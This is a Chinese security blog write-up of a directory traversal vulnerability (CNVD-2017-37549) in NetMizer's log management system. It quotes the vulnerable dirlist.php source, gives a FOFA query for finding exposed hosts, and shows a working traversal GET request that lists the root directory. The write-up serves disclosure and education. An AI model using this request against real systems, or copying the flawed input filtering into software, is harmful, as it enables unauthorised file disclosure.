---
title: "NetMizer日志管理系统 dirlist.php 目录遍历漏洞（CNVD-2017-37549）"
source: https://mrxn.net/jswz/netmizer-data-manage-dirlist-node-directory-traversal.html
asset_dir: assets/netmizer日志管理系统-dirlist.php-目录遍历漏洞（cnvd-2017-37549）
---

# NetMizer日志管理系统 dirlist.php 目录遍历漏洞（CNVD-2017-37549）

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/11 12:24
- 1090浏览
- [0评论](#comment)
- 33分钟阅读

深入探索

授权

验证

身份验证

---

# 漏洞简介

NetMizer日志管理系统是一款用于网络流量管理和优化的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用生成的日志数据。然而，该系统中的 `dirlist.php` 接口未对用户输入进行充分验证，存在[目录遍历](https://mrxn.net/tag/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86)漏洞（Directory Traversal）。攻击者可以通过构造恶意请求，利用该漏洞访问系统中未经授权的文件或目录，从而可能导致敏感信息泄露。

漏洞修复方案

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

深入探索

Nessus

服务器安全服务

编码转换工具

# 漏洞分析

看下 `dirlist.php` 文件业务逻辑实现

```
<?php

        include('../include/JSON.php');

        $node = str_replace("'", "", $node);
        $node = str_replace("\"", "", $node);
        $node = str_replace("\\", "", $node);
        $pos = strpos($node,";");
        if($pos != false) $node = substr($node, 0, $pos);
        $pos = strpos($node,"|");
        if($pos != false) $node = substr($node, 0, $pos);
        $pos = strpos($node,"#");
        if($pos != false) $node = substr($node, 0, $pos);

        if($node == "" || $node == "/" || strstr($node, "NMLog") == false) $node = "/home/lingzhou/NMLog";
        $node = "'".$node."'";

        $dirpath = $node."/";

        $cmd_type = "ls -al $dirpath | awk '{print $1}'";
        $cmd_bytes = "ls -al $dirpath | awk '{print $5}'";
        $cmd_time1 = "ls -al $dirpath | awk '{print $6}'";
        $cmd_time2 = "ls -al $dirpath | awk '{print $7}'";
        $cmd_time3 = "ls -al $dirpath | awk '{print $8}'";
        $cmd_name = "ls -al $dirpath | awk '{print $9}'";

        $arr_type = array();
        $arr_bytes = array();
        $arr_time1 = array();
        $arr_time2 = array();
        $arr_time3 = array();
        $arr_name = array();
        exec($cmd_type,$arr_type);
        exec($cmd_bytes,$arr_bytes);
        exec($cmd_time1,$arr_time1);
        exec($cmd_time2,$arr_time2);
        exec($cmd_time3,$arr_time3);
        exec($cmd_name,$arr_name);

        $arr_result = array();
        for($i = 0; $i < count($arr_name); $i++){

                $time = $arr_time1[$i]." ".$arr_time2[$i]." ".$arr_time3[$i];
                $time = mb_check_encoding($time, 'UTF-8') ? $time : mb_convert_encoding($time, 'UTF-8', 'gbk');
                $name = $arr_name[$i];
                $name = mb_check_encoding($name, 'UTF-8') ? $name : mb_convert_encoding($name, 'UTF-8', 'gbk');

                if($arr_name[$i] == "" || $arr_name[$i] == "." || $arr_name[$i] == "..") continue;
                if($arr_type[$i][0] == 'd'){
                        $leaf = 0;
                        $fullname = $dirpath.$name;
                        $cmd = "du -s $fullname | awk '{print $1}'";
                        $arr = array();
                        exec($cmd, $arr);
                        $bytes = $arr[0]*1024;
                } else {
                        $leaf = 1;
                        $bytes = $arr_bytes[$i];
                }
                $arr_result[] = array(
                        "id"=>$dirpath.$name,
                        "name"=>$name,
                        "leaf"=>$leaf,
                        "bytes"=>$bytes,
                        "time"=>$time
                );
        }

        $arr_result = array("text"=>".", "children"=>$arr_result);
        $json = json_encode($arr_result);
        echo $json;

?>
```

虽然 `$node` 参数的处理过滤了常见的 `'`、`"`、`\`、`;`、`|`、`#` 等特殊字符串，但是没有过滤 斜杠 `/` 和 点 `.` ，导致可以进行跨目录进行[目录遍历](https://mrxn.net/tag/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86)。只需要满足 `node` 中包含 `NMLog` 即可。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/manage/dirlist.php?node=/home/lingzhou/NMLog/../../../ HTTP/1.1
Host: netmizer.mrxn.net
```

成功跨目录遍历出根目录文件列表

[![NetMizer日志管理系统 dirlist.php 目录遍历漏洞（CNVD-2017-37549）](images/img-001-0cdfeba1239f.webp)](https://image.mrxn.net/d24560183abc4a19b13564651e9b7f58.webp)

# 参考

- `https://www.cnvd.org.cn/patchInfo/show/110043`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#目录遍历](https://mrxn.net/tag/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

文件大小转换
